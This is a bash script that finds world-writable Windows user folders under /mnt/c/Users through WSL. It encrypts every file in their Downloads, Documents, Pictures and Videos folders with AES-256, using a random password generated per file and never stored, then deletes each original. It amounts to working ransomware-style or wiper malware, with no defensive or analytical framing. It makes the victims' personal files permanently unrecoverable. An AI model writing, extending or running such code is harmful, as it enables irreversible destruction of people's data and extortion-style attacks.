#!/bin/bash

# Define a function to list all folders in the /mnt/c/Users directory
function list_folders_in_users() {
  # Check if the /mnt/c/Users directory exists
  if [ -d "/mnt/c/Users" ]; then
    local folders=""
    # Loop through each subdirectory within /mnt/c/Users
    for dir in /mnt/c/Users/*; do
      # Check if the current subdirectory is a directory
      if [ -d "$dir" ]; then
        # Skip the Public directory
        if [ "$dir" != "/mnt/c/Users/Public" ]; then
          # Get the permissions of the current subdirectory
          permissions=$(stat -c "%A" "$dir")
          # Check if the subdirectory has world-readable and writable permissions
          if [ "$permissions" == "drwxrwxrwx" ]; then
            # Add the subdirectory to the list of folders
            folders+="$dir "
          fi
        fi
      fi
    done
    # Return the list of folders
    echo "$folders"
  else
    # Return an error message if the /mnt/c/Users directory does not exist
    echo "/mnt/c/Users does not exist."
    return 1
  fi
}

# Get the list of folders
folders=$(list_folders_in_users)
# Check if the list of folders was returned successfully
if [ $? -eq 0 ]; then
  # Loop through each folder
  for folder in $folders; do
    # Loop through each subfolder to encrypt files in
    for subfolder in "Downloads" "Documents" "Pictures" "Videos"; do
      # Build the full path to the subfolder
      subfolder_path="$folder/$subfolder"
      # Check if the subfolder exists
      if [ -d "$subfolder_path" ]; then
        # Loop through each file within the subfolder
        for file in "$subfolder_path"/*; do
          # Check if the current item is a file
          if [ -f "$file" ]; then
            # Generate a random password for encryption
            password=$(openssl rand -base64 32)
            # Encrypt the file using AES-256 encryption with the generated password
            openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k "$password"
            # Remove the original unencrypted file
            rm "$file"
          fi
        done
      fi
    done
  done
  # Confirm that the files have been encrypted
  echo "The specified files have been encrypted."
else
  # Report an error if there was a problem with the list of folders
  echo "An error occurred."
fi
